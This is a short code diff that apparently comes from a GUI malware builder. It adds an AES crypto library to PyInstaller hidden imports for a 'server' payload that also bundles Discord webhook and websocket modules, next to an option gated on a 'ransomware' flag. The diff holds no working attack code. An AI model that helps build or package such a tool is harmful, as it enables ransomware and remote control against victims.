@@ -498,6 +498,7 @@ class App(customtkinter.CTk):
         ] if ransomware else []
 
         server_imports = [
+            '--hidden-import', 'Cryptodome.Cipher.AES',
             '--hidden-import', 'discord_webhook', 
             '--hidden-import', 'websocket', 
             '--hidden-import', 'discord',
